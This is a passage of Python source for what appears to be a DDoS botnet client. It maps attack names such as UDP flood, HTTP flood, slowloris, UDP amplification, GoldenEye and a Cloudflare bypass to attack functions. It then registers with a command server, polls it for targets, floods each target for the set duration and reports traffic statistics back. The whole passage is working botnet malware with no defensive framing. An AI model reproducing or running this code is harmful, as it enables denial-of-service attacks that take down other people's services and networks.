    "udp_flood": attack_udp_flood,
    "http_flood": attack_http_flood,
    "slowloris": attack_slowloris,
    "cloudflare_bypass": attack_cloudflare_bypass,
    "udp_amplification": attack_udp_amplification,
    "goldeneye": attack_goldeneye,
    "tcp_mixed": attack_tcp_mixed,
    # Backward compatibility
    "udp_amp": attack_udp_amplification,
    "slowloris": attack_slowloris,
    "tcp_mixed": attack_tcp_mixed,
    "http_requests": attack_http_flood,
    "cloudflare_bypass": attack_cloudflare_bypass,
    "goldeneye": attack_goldeneye,
    "udp_god": attack_udp_amplification,
    "http_flood": attack_http_flood,
    "tcp_syn": attack_syn_flood,
    "hammer": attack_http_flood,
}

def launch_attack(method, target, duration):
    """Launch an attack with the specified method"""
    if method in ATTACK_METHODS:
        print(f"Starting {method} attack on {target} for {duration} seconds")
        start_time = time.time()
        
        # Reset performance stats
        performance_stats["packets_sent"] = 0
        performance_stats["requests_sent"] = 0
        performance_stats["bandwidth_used"] = 0
        performance_stats["start_time"] = time.time()
        
        ATTACK_METHODS[method](target, duration)
        end_time = time.time()
        
        # Calculate performance metrics
        total_time = end_time - start_time
        pps = performance_stats["packets_sent"] / total_time if total_time > 0 else 0
        rps = performance_stats["requests_sent"] / total_time if total_time > 0 else 0
        mbps = (performance_stats["bandwidth_used"] / total_time) / 1000000 if total_time > 0 else 0
        
        print(f"{method} attack on {target} completed in {total_time:.2f} seconds")
        print(f"Performance: {pps:.0f} packets/sec, {rps:.0f} requests/sec, {mbps:.2f} Mbps")
    else:
        print(f"Unknown attack method: {method}")

# Server communication functions (unchanged from original)
def register_with_server(server_url, client_id, attack_methods):
    """Register client with the server"""
    try:
        response = requests.post(
            f"{server_url}/register",
            json={
                "client_id": client_id,
                "attack_methods": attack_methods,
                "status": "online",
                "threads": MAX_THREADS
            },
            timeout=10,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def get_attack_command(server_url, client_id):
    """Get attack command from server"""
    try:
        response = requests.get(
            f"{server_url}/command/{client_id}",
            timeout=5,
            verify=False
        )
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return None

def send_attack_result(server_url, client_id, result):
    """Send attack result to server"""
    try:
        response = requests.post(
            f"{server_url}/result/{client_id}",
            json=result,
            timeout=10,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def client_loop(server_url, client_id):
    """Main client loop that communicates with server"""
    # Register with server
    if not register_with_server(server_url, client_id, list(ATTACK_METHODS.keys())):
        print("Failed to register with server")
        return
    
    print("Registered with server, waiting for commands...")
    
    while True:
        # Check for attack commands
        command = get_attack_command(server_url, client_id)
        if command:
            print(f"Received command: {command}")
            
            # Execute the attack
            method = command.get("method")
            target = command.get("target")
            duration = command.get("duration", 60)
            
            if method and target:
                try:
                    # Launch the attack
                    launch_attack(method, target, duration)
                    
                    # Send result to server
                    send_attack_result(server_url, client_id, {
                        "status": "completed",
                        "method": method,
                        "target": target,
                        "duration": duration,
                        "packets_sent": performance_stats["packets_sent"],
                        "requests_sent": performance_stats["requests_sent"],
                        "bandwidth_used": performance_stats["bandwidth_used"]
                    })
                except Exception as e:
                    # Send error to server
                    send_attack_result(server_url, client_id, {
                        "status": "error",
                        "method": method,
                        "target": target,
                        "duration": duration,
                        "error": str(e)
                    })
            else:
                print("Invalid command: missing method or target")
        
        # Wait before checking again
        time.sleep(5)

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print("Usage: python attack_methods.py <server_url> <client_id>")
        sys.exit(1)
    
    server_url = sys.argv[1]
    client_id = sys.argv[2]
    
    client_loop(server_url, client_id)
